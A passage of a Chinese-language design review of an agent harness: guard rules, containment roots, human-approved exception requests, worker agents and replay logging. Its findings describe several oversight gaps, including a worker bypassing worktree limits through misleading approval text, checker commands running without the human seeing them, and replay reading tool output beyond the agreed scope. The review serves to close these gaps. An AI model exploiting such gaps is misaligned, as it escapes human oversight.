问题：D2 人选 B，边界是「只读工具调用的命令文本与路径，不读对话正文」（`m4` 2026-10-29T17:33Z 的批注，原话「不介意」）。§3.6 另读每个出错的 `tool/result` 的前 120 个字符，在内存里与已知的 guard 纠偏开头比较，给出「当时拦没拦」。出错的 shell 调用，结果就是命令的输出，内容任意，可能有文件内容或密钥；它既不是命令文本，也不是路径。读完不留存、不输出，但读的范围超出了人同意的那一句。另有两项读的是元数据：请求头里的模型名（判来源）与会话头的工作目录（圈禁根），也不在那一句里。`onepage.md` 对人说的是「只看命令和路径」「只看命令和路径，不看聊天内容」。

改法：

1. 删掉对结果文字的比较。「当时拦没拦」改从项目自己的违规流水对：同一 `sessionId`、同一工具名、记录时刻与 `tool/call` 的时刻相差 2 秒以内的拒绝记录算 `denied`，对不上记 `unknown`；`tool/result` 只读 `isError` 这个布尔值，用来数「当时报错」。
2. 一页放行稿与 §3.6 照实写读什么：「只看工具名、命令、路径，以及当时用的哪个模型、在哪个目录、调用有没有报错；不看聊天内容和工具输出」。
3. L2：夹具里出错的结果带一个标记串，回放的内存条目、`replay.jsonl` 与 `summary.json` 里都找不到它（今天的 L2 只查写入内容里的标记串）。

挡路依据：违背人定的边界（D2 B）。

#### N27 NIT `renderPlan` 与 M3 的四行规则是两份

位置：§5.4 :689–691；§2.2 `src/graph/plan-text.ts`；§2.3「harness 写给人的方案文字」一行；§12。M3 附录 0.3 §3.3 已在 `src/graph/proposal.ts` 定下四行的规则与拼法：`PROPOSAL_LABELS`、`PROPOSAL_LIMITS`（每行 40 码点，加粗 2–12 码点）、`proposalLineRefusal`、`splitBold`、`renderProposal`，背景取 `PLAIN_LIMITS.background`（plain-ui 0.6 定为 60）。`renderPlan` 另定每行 60、题目 80、加粗不限长度。人下次改格式要改两处，与 §2.3 说的「格式再改只改这一个文件」不符。改法：`renderPlan` 的四行用 `proposalLineRefusal` 与 `PROPOSAL_LABELS`（M3 第 6 步建；G4、R1 先开工时照附录 §3.3 原样建这个文件，M3 改成导入）；`plan-text.ts` 只加 M3 没有的三样：题目可带路径（至多 80 码点）、「附」一段、问话一段。§2.3 那一行改为「四行的规则在 `src/graph/proposal.ts`，`plan-text.ts` 只拼 harness 自己的附加段」。

#### N28 NIT 申报文字的「疑问」一行没写哪个事实会改方案

位置：§5.4 :702 与题目表的 `checker-config` 一行。「这个文件**该不该让 agent 改**，只有你清楚」是把问题原样推给人。改法：写一个可核对的事实，例「这个文件若**不归这件活管**，就不该放行」；`checker-config`「这次改动若**让检查变松**，就不该放行」。

#### N29 NIT 同一条回复里既有 `propose_to_human` 又有申报文字时，两边的说明相反

位置：§5.3 `ask` 的 `message`。M3 附录 §3.4 的输出说明要主 Agent「End your reply with one question for everything you showed」；M4 要申报文字放在回复最末、用它自己的问话收尾。两样都放时，人的一句「可以」可能被 `record_human_answer` 当作对前面几件的同意，同时放行了申报。改法：`request_exception` 第 5 条之后加一条：本会话从最后一条人的消息以来已经出示过 `propose_to_human` 的结果（M3 的 `shownProposals`）时返回 `busy`，`hint`「end this reply with the proposals you showed; file the request after the human answers」；`ask` 的说明加「Do not call propose_to_human in this reply.」；§18 第 5 条给 `m3` 加一句。

#### N30 NIT 正路就是停下来时，跟进记成「没有下一步」，拉低「走对」的比例

位置：§3.3 结果表与各规则的 `rightPath`；§3.10「拦截后下一步走对 x/y」。子 agent 被圈禁拒绝的正路是把编号写进结果交回（§5.2）；G4 之前圈禁的正路是告诉人（main 上 `61be79a` 的 `ASK_THE_HUMAN`）；file-tools-only 的例外是「say so in your reply」。这几种做对了的情形都结算成 `none`，晨报的分母照算。改法：晨报写「走对 x/y（另有 n 次停下来交给人或上级）」，`y` 不含 `none`；`stats` 已有四类计数，不改。

#### N31 NIT 规则板的「排队」被算成违规

位置：§3.2 `classifyRecord`。规则板 0.8 写进流水的记录带 `effect`，取值 `block`、`queue`、`shadow`（§10.5 :1433；`Effect` :718）。高峰「不做」档下 GLM 会话的调用判为排队，记录是 `mode: 'enforce'`、`effect: 'queue'`，`classifyRecord` 把它算成 `denial`，晨报写成「违规」。改法：`RecordClass` 加 `'deferral'`（`effect: 'queue'`），不进「违规」，由规则板的晨报一节（R7）去数；L2 一例。

#### N32 NIT 给兄弟设计的接缝请求要现在记，循环板的规则也要经 `installRuleGate`

位置：§18 第 5 条（「人放行之后由编排者记到图上」）；§2.3、§3.8、§13.3 的行清单。兄弟设计正在改，读到的版本都还没有接上：M7 0.4 的写入规则仍用 `evaluate`（:339），转生效的判据仍是「近 14 天影子记录不少于 20 条且人没标过误判」（:912）；循环板 0.4 的 `loops:schedule-tools` 用 `GuardRule`、`evaluate`、`renderCorrection`（:679）；规则板 0.8 的代码规则目录只列 guard 的两条与图文件一条，没有 M4 的四条影子规则，也没有改成导入 `src/guard/catalog.ts`（:1396），:196 仍引 `evaluate`。G1 删掉 `evaluate` 之后循环板那一行编译不过；`loops:schedule-tools` 不在 §2.3 的行清单与 `GUARD_RULES` 里，§3.8 的第一条契约测试在循环行合入时失败。改法：§2.3、§3.8、§13.3 加循环行（`loops:schedule-tools` 经 `installRuleGate` 安装，登进 `GUARD_RULES`，读流水用 `classifyRecord`）；§18 第 5 条的批注（`rules`、`m7`、`m3`、`schedules`、`m8-plain-language`）是 agent 之间的接缝请求，不是人的决定，写进 `graph-ops-v03.json`，现在就记。

#### N33 NIT 一页放行稿的几处说法

位置：`onepage.md`；§17 D1 :1258；§19.2 F10 一行。

- 「共 27 条约 3,300 字」：§1.2「建议验收」一列（:48–54）是 27 条、2,973 个字符，写「约 3,000 字」。
- 「主 Agent 自己做完、自己审、自己合进主干」：审查由主 Agent 派别的 agent 做，改到拦截规则的步由 harness 强制全审（`norm-review-floor`），写「自己派活、派人审查、合进主干」。
- 「读登录密钥文件只记录，永远不拦」：这是 agent 定的（§16，人可推翻），写「先定为只记录、不拦」。
- 「电脑或 DSH 重启之后」：插件重新加载也会丢（§5.3 末段），写「电脑、DSH 重启或插件重新加载之后」。

#### N34 NIT 设计的依据比 main 旧，G1 的「今天必败」有一条已经不成立

位置：文件头「依据：main `8599304`」；§5.2 :632–636；§13.1 G1 的「今天必败」最后一项；§14.1 第一行。main `fe0bace` 上的 `61be79a`（fix(guard): exception part sends the model to the human）已删掉 `APPLICATION_PROTOCOL`，两条规则的例外改为 `ASK_THE_HUMAN`（`src/guard/rules.ts`:51–56、:94、:144），探针的纠偏期望随之改过。改法：依据改为 `fe0bace`；G1 去掉「去掉 `APPLICATION_PROTOCOL`」与「圈禁的纠偏写『file a request』」一项，圈禁的例外 G1 不再改（G4 换成带编号的两种情形）；file-tools-only 的新文案留在 G1 或并入 G4，二选一写定。`src/toolsearch/index.ts`:155–175 在两个提交之间没有变（改动在 :193 之后），§3.3 与 H11 的行号照旧。

### 已核实的假设（本轮新增）

- 人的消息带 `rpcId` 的只有两处，都来自客户端的远程调用：`api-session-controller` 的 `prompt`（:3222–3229 建 `source {kind: 'user', rpcId: request.requestId, …}`，:949–950 按 `mode` 走 `steer` 或 `followup`）与 `subagent` 的 `prompt`（:3194–3200）。不带 `rpcId` 的用户角色消息：acp:835、commands:338、headless:345、plan-mode:221、sdk-jsonrpc-server:161、subagent:1461、command-goal:105、session-title:305。DSH 自己用同一个判断认客户端消息：client-file-upload:296–297、experimental-auto-review:92、time-context:12。定时服务投递的是 `source {kind: 'schedule'}`（schedule:1586–1596）。H19 的说法成立。
- H20：client-connection:273–300（进程启动令牌）、:414–434（签名密钥取自凭证服务）、:505–522（`/connect` 换 cookie）。
- agent loop：`appendToolCall` 在 `prepare` 之前（:580–582）；`preStep` 领收件箱并跑 `agent/pre-step` 瀑布（:902–918）；领出的消息在 `step()` 里才写进会话（:1066–1073），所以步 notice 读到的历史里还没有这一步的人的消息；`turn/end`（:1029）。session：`commit` 同步通知 `session/event`（:1579–1592）；`session/disposed`（:1928–1933）。
- `installStepNotice` 的 `admitted` 就是 `decision.messages`（`src/shared/step-notice.ts`:28–41）；`toNativeTool` 无方言服务时退到 `ZCODE_ALIAS_NATIVES`（`src/shared/dialect.ts`:30–33、:70–80）。
- ZCode 3.17.1：`zcode.cjs` 15,405,921 字节；第 132 行 `Hb="DeferredToolCall",BNe=V.object({name:V.string().min(1),input:V.record(V.unknown())}).strict()`；`Write`、`Edit`、`Glob`、`Grep`、`Bash`、`Read`、`TodoWrite` 各有一处 `name:"<名字>"`。
- 引擎：`decide` 要求选项键（engine.ts:517–519）；`OPEN_PARENT_TYPES` 含 `question`（:104），`initialStatus`（:417–428）；`TRANSITIONS` 里 `done` 只能到 `doing`（:110–117）；`LLM_EDITABLE`（:101）。`src/guard/index.ts`:52 导入 `src/graph/service.ts`，`renderPlan` 放在 `src/graph/` 的方向理由成立。
- goal：`dsh-goal-round-driver` 在 agent 空闲、goal 活着且已 arm、轮次有余时经 `followup` 排进 `source {kind: 'goal'}` 的一轮（README；lib:144–164）；模型在 goal 轮里不能马上标 `blocked`（tool-goal:360）。M7 0.4 放行之后建 goal（:46、:813），`await_human` 只收图上的待决（:803），`worker-scope` 只许写工作树（:341–347），规则以 `prepend` 注册且仍用 `evaluate`（:339）。
- M3 附录 0.3：`propose_to_human` 只给主 Agent（§3.4 第 1 条）；提议式待决与 `decide {conclusion}`（§3.3）；`record_human_answer` 的 `question` 一种（§3.5）；`personSaid` 认 `source.kind === 'user'` 且没有 `form` 的消息、不要求 `rpcId`（§3.6），比 M4 的认法宽，各有理由（M3 的模拟人不带 `rpcId`，§3.10）。
- 循环板 0.4：`Contribution`（:324–332）、`contribute` 与 `recordRun`（:404、:408）、交法（:429）、给 M4 的条目与请求（:244–246、:601–602、:1266–1269）。plain-ui 0.6「需要你」三种事（:96）与现场投影只记两个工具（:371）。规则板 0.8 流水记录的形状（:1433）、`Effect`（:718）、代码规则目录（:1396）。
- `d-chat-not-cards` 全部历史：17:01Z 人的原话，17:08Z 人对五点落地方案「没问题」与「不做」不是选项的说法，17:23Z–17:27Z 的格式定稿；M4 的四行格式与定稿一致（题目一段，四行各自成段，标签不加粗，每行一处加粗，问话最后）。
- §1.2「建议验收」一列：27 条、2,973 个字符（N33）。
- `norm-review-floor` 的四条验收与 M4 §13 的全审清单一致；M7 0.4 的 F2 让清单判不了时一律全审，所以 G1–G4、C1 的全审今天就落得下。

### 没有核实或说法有误的假设（本轮）

- 有误：§4.6、§13.3 :1132 说人定的题去掉选项字段要等「改写 `d-option-card` 的那件事（还没有节点）」；提议式待决是 M3 第 6 步，见 F12。
- 有误：§5.5 放行说明与 §5.6 假定主 Agent 能派一个子 agent 原样写；在 M7 下不能，外层的门也不让 guard 发出编号，见 F13。
- 有误：§5.5 假定人的下一条消息紧跟在申报文字之后；有活着的 goal 时多半不是，见 F14（轮次时机是推断）。
- 不一致：`onepage.md` 的「只看命令和路径」与 §3.6 :463 读出错结果的文字，见 F16。
- 过时：依据 `8599304`，`61be79a` 已改了拒绝文案，见 N34。
- 没有核实：DSH 桌面客户端在 agent 运行时发消息默认用 `steer` 还是 `followup`（F14 的两种情形都写了）；各行导入 `dist/guard/followup.js` 拿到同一个模块实例（设计已标推断，L3 `guard-followup` 核对）；§3.6 的本机实测数字（719 个日志等）与 §6.1 的耗时，本评审没有读 `~/.dsh`。
- 依赖兄弟设计跟进：规则板 0.8、M7 0.4、循环板 0.4 读到的版本都还没有接 `installRuleGate`、`classifyRecord`、`PROMOTION` 与目录导入，见 N32。

### 结论

CHANGES_REQUESTED：挡路 6 条（F11–F16，都是 MEDIUM），非阻断 8 条（N27–N34）；第 2 轮的 15 条全部关闭（N17、N19 因卡片与面板批准取消而不再适用）。各轮挡路条数 8、2、6，本轮比上一轮多；这是 question-11 的第三轮，按 `d-failure-plans` 的规矩停下交人。新挡路的来源：F11、F15 是 0.2 之后人定的方向（`d-rules-visible`、`d-chat-not-cards` 落地方案第 4 条）没有接上；F12 是新问法里又出现了二选一；F13、F14 是 0.3 的申报通道遇上 M7 0.4 的写入门与 `d-auto-drive` 的 goal；F16 是回放读的范围比人同意的宽。

## 第 4 轮（design.md 0.4）

这是人准的最后一稿（`m4` 2026-10-30T05:50Z 的批注，原话「M4那就再改吧」）：本轮仍有挡路时停下报人，不再开修订。

核对范围：0.4 全文（§0–§19.3）、`design-0.3.md`（逐段对照）、`graph-ops-v04.json`；main `fd7ac1f`（设计依据 `820eb78` 之后 8 个提交，`src/`、`tests/`、`scripts/`、`packages/` 没有改动）；`src/guard/index.ts`（`rootsFor` :90–95、`activeRules` :86–88）、`src/guard/rules.ts`:51–56、`src/graph/engine.ts`:104–117 与 :596–617、`src/graph/index.ts`:76–81、`src/memory/audit.ts`:42–48、`src/shared/dsh-min.ts`:457–469、`src/toolsearch/index.ts`:155–176；`.agents/tasks/design-context.md`（2026-10-30 14:41 版，读到末节「Worked examples for the agent」）；图节点 `m4`、`m4-request-card`、`d-boards-as-hooks`（含 06:25Z 的批注）、`d-rules-in-repo`（含 05:50Z 的批注）、`d-main-agent-peak-exempt`、`d-design-onepage`、`d-chat-not-cards`、`d-plain-questions`、`d-memory-scope`、`d-script-timeout`、`d-agent-examples`、`d-alignment-rounds`、`reading-digest`。兄弟设计：循环板 0.4（`schedules/design-0.4.md`，第 4 轮批准；§2.1–§2.4、§3.1–§3.3、§7.1–§7.3）与盘上正在写的 0.5（`schedules/design.md`，14:46，与 M4 0.4 同时在写，只读了 M4 用到的几处）；规则板 0.9（盘上正在写）只看了版本说明；M3 附录 0.4（§3.3–§3.5）；M7 0.4（§3.1、§3.2.1、§3.2.2、§3.4.2、§3.9.5）；plain-ui 0.7（§4.3 第 6 条、§4.9、§5.3）。

0.4 是完整的：§0–§19 都在，§19.3 两张表逐条对应第 3 轮的 14 条与评审之后的人定；`design-0.3.md` 的版本行是 0.3，`onepage-0.3.md` 与 `onepage.md` 的 SHA-256 相同（`onepage.md` 仍是 0.3 的，按简报评审通过之后才重写）；`graph-ops-v04.json` 是合法的 JSON，七条批注。

### 第 3 轮发现的状态

| 发现 | 状态 | 核对 |
| --- | --- | --- |
| F11 MEDIUM 检查器与第三次修复都不在循环板上 | 关闭 | 两份交来的内容按循环板 0.4 §3.1 的 `Contribution` 写（§6.8 表），`ownRules` 由四个常量拼、不超过 §2.1 的 6 行 × 80 码点，`details` 不超过 20 行 × 160 码点；`ctx.inject([LOOPS_SERVICE])` 的交法与 V12 不成立时的退路照循环板 §3.1；`recordRun` 每项检查、每次提问各一次；验收 `m4-checks` 第 5 条、`m4-rules` 第 2 条末句；§13.3 一行；§18 第 5 条与 `graph-ops-v04.json` 给 `schedules`；§1.5 方向清单自查。0.4 同时把「人加的检查」也改成板上的条目，这一部分与循环板没有对上，另见 F17 |
| F12 MEDIUM 第三次修复的问话让人二选一 | 关闭 | 提议式待决、没有五个选项字段（§4.6 表）；四行按 `proposalLineRefusal` 数过（本轮逐条复数：背景 31、推荐 19、疑问 18、不做 16 个码点，加粗 10、6、11、5，题目至多 35）；问话只问「先停下查原因，可以吗？」；疑问一行写出可核对的事实；R1 依赖 M3 第 6 步；L2 钉住。「原样再给人看」要 M3 新加一种 `propose_to_human`，理由实读成立（engine.ts:613 对没改任何字段的 `edit` 返回 `invalid`）。题目嵌入节点标题的问题 0.3 就有，另见 F18 |
| F13 MEDIUM 装了 M3 与 M7 之后申报走不通 | 关闭 | 服务 `glmHournessRequests` 的三个成员与 `RequestsServiceContractCheck`（§5.9）；`peekGrant` 只读、核对与用掉只在 guard 行（§5.6 末条、§12）；worker 经 `ask_main` 等、主 Agent `answer_worker`、20 分钟之后的退路（§5.9 第 6 条）；M7 0.4 §3.1.2 第 8 步的 `startActivation` 带 `parent: 主 Agent`，「worker 的 `dispatchRoot` 是主 Agent」有出处，设计标了推断并由 L3 `guard-request-worker` 核对。`outsideDenial` 判「工作区外」的边界与实际的圈禁根不一致，另见 F19 |
| F14 MEDIUM 自动推进时人的「可以」很难紧跟申报文字 | 关闭 | `openRequests` 与 M7 以 `hourness-waiting-human` 停住与恢复（§5.9）；每一回合首步的再出示提醒（§5.5 第 2 条）；没有 M7 时 `ask` 说明的末句与 §11 一行；L3 `guard-request-goal`。`createUserNotice` 把来源种类写成调用方给的 `kind`（dsh-min.ts:467），M7 与循环板的提醒因此不会被当成「别的 `kind: 'user'` 消息」记成 `not-client`，§5.5 第 2 条的三分法成立。验收第 3 条与 §5.5 第 2 条的条件不一致、停住之后没有一步时不会过期，见 N35、N38 |
| F15 MEDIUM 等人回话的申报在「需要你」里看不到 | 关闭 | 开是 `ask` 结果（另带 `lines`），关是带 `request: {ref, outcome}` 的 `hourness-request` 提醒（§5.5 末段，事实字段经 `createUserNotice` 原样进 `source`，dsh-min.ts:467 实读），重启之后补 `lapsed`；§18 第 5 条与 `graph-ops-v04.json` 请 `m8-plain-language` 在 (b) 一类列出（plain-ui 0.7 的 `graphLive.awaiting` 今天只收 `confirm`、`release`、`unknown`，§4.9 :735，所以这是一条要面板改的请求，已记）；§15 那一条删去 |
| F16 MEDIUM 回放读了工具结果的文字 | 关闭 | `tool/result` 只读 `toolCallId` 与 `isError`，`content` 在解码处丢掉（§3.6 第 2 条）；「当时拦没拦」按同一会话、同一工具名、2 秒以内对项目的流水，对不上记 `unknown`；读的每个字段写明；L2 用出错结果里的标记串钉住（§3.6 末条、§1.2 `m4-shadow` 第 4 条）。回放读哪些会话没有按项目限定，见 N39 |
| N27 `renderPlan` 与 M3 的四行规则是两份 | 关闭 | 四行用 `proposal.ts` 的 `PROPOSAL_LABELS` 与 `proposalLineRefusal`，`plan-text.ts` 只加题目、「附」、问话（§2.2、§5.4） |
| N28 申报文字的疑问一行 | 关闭 | 「这个文件若**不归这件活管**，就不该放行」；`checker-config` 一行同改（§5.4 表） |
| N29 同一条回复里既有提议又有申报 | 关闭 | §5.3 第 5a 条只读本会话历史；`ask` 的说明加「Do not call propose_to_human in this reply.」；另一侧请 M3（§18、`graph-ops-v04.json`） |
| N30 正路就是停下时「走对」被拉低 | 关闭 | 「走对 x/y（另有 n 次……）」，`y` 不含 `none`（§3.3、§3.10），L2 一例 |
| N31 规则板的排队被算成违规 | 关闭 | `RecordClass` 加 `deferral`，`classifyRecord` 的注释写明判法（§3.2），G1 的 L2 一例 |
| N32 接缝请求要现在记；循环板的规则经 `installRuleGate` | 关闭 | `loops:schedule-tools` 进 §2.3、§3.1、§3.8 与验收 `m4-shadow` 第 6 条；七条批注在 `graph-ops-v04.json` |
| N33 一页放行稿的几处说法 | 部分关闭 | 设计里的部分已改：D1 按 0.4 重数为 32 条（本轮复数：§1.2「建议验收」一列 32 条、4,546 个码点，「约 4,500 字」成立），「重启」都写成含插件重新加载。「派人审查」「先定为只记录、不拦」在 `onepage.md` 里，按简报只在评审通过之后重写；本轮不通过，`onepage.md` 仍是 0.3 的文字 |
| N34 依据比 main 旧 | 关闭 | 依据 `820eb78`；`820eb78..fd7ac1f` 在 `src/`、`tests/`、`scripts/`、`packages/` 没有改动（`git diff --stat` 为空）；`rules.ts`:51–56 的 `ASK_THE_HUMAN`、`toolsearch/index.ts`:155–176 实读与设计一致；G1 的「今天必败」已去掉两项过时的 |

### 发现

#### F17 MEDIUM 人加的检查条目要循环板改五处，还漏请了「给人看原文」这道防线；循环板 0.5 草稿走的是相反的路

位置：§6.1（检查条目的表与「怎样加一项」，design.md:1006）、§6.8、§11 不可逆表「检查命令执行任意命令」一行（:1286）与「读本项目的检查条目」一行（:1261）、§13 开工条件、§13.3 循环板一行、§18 第 5 条 `schedules`（:1577）、`graph-ops-v04.json` 给 `schedules` 的批注；验收 `m4-checks` 第 1、2、5 条。

问题：0.4 照 `d-boards-as-hooks` 把每一项检查定为循环板上人加的条目（`env.files-edited` + 筛选 + 自带的 `check {format, argv, timeoutSeconds?}` 或脚本），人在四行方案里看到命令原文、同意即生效。方向对，接缝裁定也要「两块板一条同意的路」。但这条路要循环板改的地方，循环板这两稿与 M4 的请求都没对上：

- 循环板 0.4（已批准）明文不收：§2.3 的动作表里 `self` 只给插件、人只能用 `tell-main` 与 `run`；§3.2「`listedOnly` 的事件只能配 `self`」；§3.1 `recordRun`「只认 `self` 条目的 id」；§2.2 的 `paths` 没有扩展名写法（`*.ts` 不带 `/`，按 0.4 是「任何一层目录里名叫 `*.ts` 的文件」）。M4 §18 第 5 条的 ①–⑤ 请它改这几处，这是正当的接缝请求。
- 缺一条请求，偏偏是安全防线：循环板 0.4 只对 `run` 动作给 `AttachDetail`（§3.1 注释「动作为 run 时是命令原文与注意事项……别的动作没有 detail」；§7.1 第 1 步「`detail`（动作为 `run` 时有，别的没有）」），`acceptProposal` 也只对 `run` 要「已给人看原文 <摘要>」的记号（§7.1 第 4 步）。M4 的 `check` 与脚本不是 `run`，照 ①–⑤ 改完之后，人同意一项检查时既看不到 `argv`，M3 也不核对给人看过（M3 附录 0.4 §3.5 第 5a 步只在带回 `detail` 时核对）。§11 对「检查命令执行任意命令」的防线写的却是「命令原文附在四行之后给人看过（循环板 0.4 §7.1 第 3 步核对）」，§16 不再读工具节点的理由也是「工具节点的批准不保证人看过命令原文」。照现在的请求落地，这条防线不存在：`argv: ['node', 'x.js']` 一类的条目可以在人没看过原文时生效，之后每次改完文件都在人的电脑上跑。
- 循环板 0.5（盘上正在写，14:46，与 M4 0.4 同时写）走的是另一条路：§5.3 第 15 项之后一段（schedules/design.md:745）与 §17 M4 第 4 条（:1652）写「检查器的命令来自人在项目图上批的 env 工具节点，那是 M4 自己的同意路，不是循环板的脚本，循环板不钉它的哈希……用哪一种由 M4 0.4 定，循环板这边不用改」，:564 仍是「`listedOnly` 的事件只能配 `self`」，:1495 人的条目只能用 `personSelectable` 的事件。两份设计各自以为对方不用改。
- M4 没有退路：§16「没有循环板时」与 §6.1 都拒绝退回工具节点，循环板不加 ①–⑤ 时本项目一项检查也跑不了；循环板在、只是没有 ② 的读取函数时，§11 :1261 那一行让环境提醒写「循环板不在」，说法不对。

所以 `m4-checks` 第 1、2、5 条要等一件还没有人定的接缝，E3 没有确定的目标；防线一条落空。

改法：

1. §18 第 5 条 `schedules` 与 `graph-ops-v04.json` 加第 ⑧ 条：`loop_propose` 对 `check` 动作同样返回 `AttachDetail`（`markdown` 里是 `commandText(argv)` 与 `cautions`，`mustShow` 是命令文字与每句注意事项），对脚本动作返回脚本原文；`acceptProposal` 对 `check` 与脚本同样要「已给人看原文 <摘要>」的记号，没有就 `invalid`（同 `run`）。§11 那一行写明这条防线要 ⑧。
2. §6.1 与 §18 照实写出与循环板 0.5 草稿的冲突（:564、:745、:1495、:1652），`graph-ops-v04.json` 加一条给编排方的请求（例如批注在 `schedules` 与 `d-boards-as-hooks` 上）：放行 M4 0.4 与循环板 0.5 之前，由编排方记一条接缝裁定（agent 定、可推翻），定「改完就跑的检查由谁定义、经哪条路同意」。按现有的裁定（「Both boards use one approval path」），推荐 M4 0.4 的做法；裁定之后两份设计各引对方的节号，谁也不重写对方的契约。
3. §13 开工条件与 §13.3 写明：E3 与验收 `m4-checks` 第 1、2、5 条、L4 第 5、8 项等这条裁定与 ①–⑤、⑧ 合入；§11 加一行「循环板在、读取函数不在或不认 `check`」：环境提醒写「循环板还不支持改完就跑的检查」，行健康写明缺哪一样。
4. L2：一条 `check` 条目的提议经假的循环板服务返回的 `detail` 含 `argv` 的命令文字；没有记号的拍板不生效（这一例由 ⑧ 合入的一方加）。

挡路依据：不可逆的风险没有防住（人没看过原文的命令每次改完都运行）；验收依赖的接缝两边相反、没有人定。

#### F18 MEDIUM harness 写给人的文字里嵌了图上的标题与路径，`renderPlan` 遇到它们会抛错，第三次修复的题目会被面板的写法检查拒掉

位置：§5.4「函数在下面的情形抛错。它只吃 harness 自己代码里的字串」（:797）、背景一行的焦点标题（:839）、题目带路径；§5.3 第 7 步（没写 `renderPlan` 抛错时怎样）；§4.6 `title` 一行（:689）与 L2「题目、四行与 `body` 过 `plainWordsIn` 为空」；验收 `m4-request-card` 第 2 条、`m4-rules` 第 2 条。

问题：

- 申报文字的背景一行写「agent 做「<焦点节点标题>」时」，题目写解析后的路径。两样都不是 harness 自己的字串：焦点标题是 agent 写的图上标题，路径是被拒调用的参数。`renderPlan` 对题目与四行跑 `plainWordsIn`，有词就抛错。plain-ui 0.7 §5.3 明说进行中的任务与特性的标题不查 `jargon`（「换成「练习题」反而让它认不出说的是标定集」，plain-ui :493），所以焦点标题里带「验收」「标定」「门禁」是正常情形（本仓库图上 84 个任务与特性的标题里有 11 个带这五个词之一）。焦点是这样一个节点时，这个会话里每一次工作区外的申报都在第 7 步抛错；§5.3 没写抛错之后怎样（工具出错、不登记、不留痕、没有 `hint`），agent 重试得到同样的错，人永远看不到申报。焦点标题里有 `*` 时 `proposalLineRefusal` 的「恰好一处加粗」不成立，同样抛错。
- 第三次修复的题目是「「<节点标题>」要修第 3 次了」，节点标题原样截取。它写进图，是 `harness` 提的人定待决。plain-ui 0.7 §5.3 的第二阶段对 `harness` 写入的待决 `title` 查 `code`（`M\d+`）、`id`、`identifier`、`term`、`jargon`，违反时引擎以 `invalid` 拒绝（:494–495）。本仓库 84 个任务与特性的标题里有 11 个带「M<数字>」（例「M4 guard 补齐与环境」），另有带文件名或标识符的，这些节点第 3 次重开时提议被拒，R1 只在 `notice` 里写原因、`recordRun` 记 `failed`，下一次重开同样失败，人一直不被问。M4 的 L2 只跑 `plainWordsIn`（M3 的五个词），拦不住这几条规则；plain-ui 第二阶段切换的前提 (c) 要求每个入口一条契约测试，用干净的示例标题也照样通过，掩盖了这件事。

改法：

1. `src/graph/plan-text.ts` 加一个纯函数 `personTitle(title, limit)`：去掉 `*` 与反引号；按 plain-ui 的 `plainIssues(text, 'title', ids)`（没合入时按 `plainWordsIn`）有任何一条就返回 `undefined`。申报背景一行在它为 `undefined` 时省去焦点半句（与读不到焦点同一种写法）；第三次修复的题目在它为 `undefined` 时写「这件活要修第 3 次了」，节点标题移进 `body` 的「附」第一行。
2. 题目里的路径是数据：`renderPlan` 对题目只查 harness 写的前半句（「要改工作区外的文件：」一类），路径原样显示、不查换词。
3. `renderPlan` 的抛错只留给 harness 自己的常量；`request_exception` 第 7 步捕获任何抛错，返回 `unavailable`，`hint`「the harness could not write the text for the human; tell the human in your reply what you need and why」，不登记申报，行健康降级并写明原因（控制台每个会话一次）；这次工具调用与结果留在会话日志里。
4. L2：焦点标题「补齐验收条件」、带 `*` 的焦点标题、含「门禁」的路径都写得出合格的申报文字；节点标题「M4 guard 补齐与环境」的 `reopenQuestion` 结果在 plain-ui 第二阶段的常量下交给真实引擎通过（plain-ui 未合入时这一例跳过并写明）。

挡路依据：验收条件没有满足（两条验收在常见的标题与路径上做不到），失败没有恢复（重试同样失败）。

#### F19 MEDIUM `outsideDenial` 判「工作区外」用的是 worker 自己的圈禁根，worker 写主检出也会变成问人

位置：§5.9 服务注释「the target is outside every containment root of this agent」与第 2 条「为 `undefined`（目标在工作区内、只是出了工作树，或 guard 行没加载）」（:971）；§5.2 第三种情形；§5.4 题目「要改工作区外的文件」；验收 `m4-request-card` 第 8 条；§14.1 `guard-request-worker`。

问题：guard 行的圈禁根是行配置的 `workspaceRoots`，没配就是调用方 agent 自己会话头的 `cwd`（`src/guard/index.ts`:90–95 `rootsFor`〔实读〕）。M7 起 worker 时 `cwd` 是工作树的绝对路径（M7 0.4 §3.1.2 第 8 步），所以 worker 的圈禁根就是它的工作树。`worker-scope` 拒绝的是「出了工作树」，guard 圈禁判的也是「出了工作树」，两者对 worker 是同一条边界：§5.9 第 2 条的「目标在工作区内、只是出了工作树 → `undefined`」在默认配置下永远不发生。后果：

- worker 写主检出（`<仓库>/src/a.ts`，工作树在 `<仓库>/.worktrees/<任务>/` 下，常见的错法是写成了主检出的绝对路径）或别的工作树，都拿到编号，例外一句换成「ask the main agent with ask_main: give ref … When it answers that the human approved, make this identical call again」。M7 给它的正路是改写自己工作树里的同一个文件或请主 Agent 放宽写入范围（M7 0.4 §3.2.1 的纠偏）；现在它被引去走问人的路，人多被问一次（`question-27` B）。
- 主 Agent 申报时，申报文字的题目写「要改工作区外的文件：C:\…\<仓库>\src\a.ts」，那是项目自己的文件，说法不对，人批的不是他读到的那件事（§12「人批的就是他读到的」）。人回「可以」之后，`peekGrant` 让 `worker-scope` 放这一次，worker 直接写主检出，绕过 M7 要守的工作树、写入范围、审查与合入前的检查（M7 0.4 §3.2.2 的理由一段）。有备份，不是不可逆，但这是一条由误导的文字换来的绕行。

改法：

1. `outsideDenial` 按项目判：目标解析之后，若 `projectRoot(目标所在的最近一个存在的目录)` 等于 `projectRoot(call.base)`（主检出与它的工作树是同一个项目，§2.4），或目标在主检出根之下，返回 `undefined`，`worker-scope` 照 M7 原样纠偏；只有出了项目（且出了行配置的 `workspaceRoots`）才登记编号。服务注释与 §5.9 第 2 条照此改写。
2. guard 行自己的圈禁对 worker 不变（它本来就该拦），所以这条改动只在 `outsideDenial` 里。
3. L2：worker 会话 `cwd` 为 `<临时仓库>/.worktrees/t`，写 `<临时仓库>/src/a.ts` 时 `outsideDenial` 为 `undefined`；写 `<临时目录>/notes/todo.md` 时得到编号，之后 `request_exception` 用它得到 `ask`。`guard-request-worker` 另加一步：worker 写主检出被拒，纠偏里没有编号。

挡路依据：放行对应的事实与人读到的不一致（§12 的不变量），且绕过 M7 的门；设计的假设与 `rootsFor` 的实际行为不符。

#### F20 MEDIUM `request_exception` 没有示范，`d-agent-examples` 没有接上

位置：§5.3 工具描述（:771）与拒绝文案；§1.5 方向清单自查；§14.2。

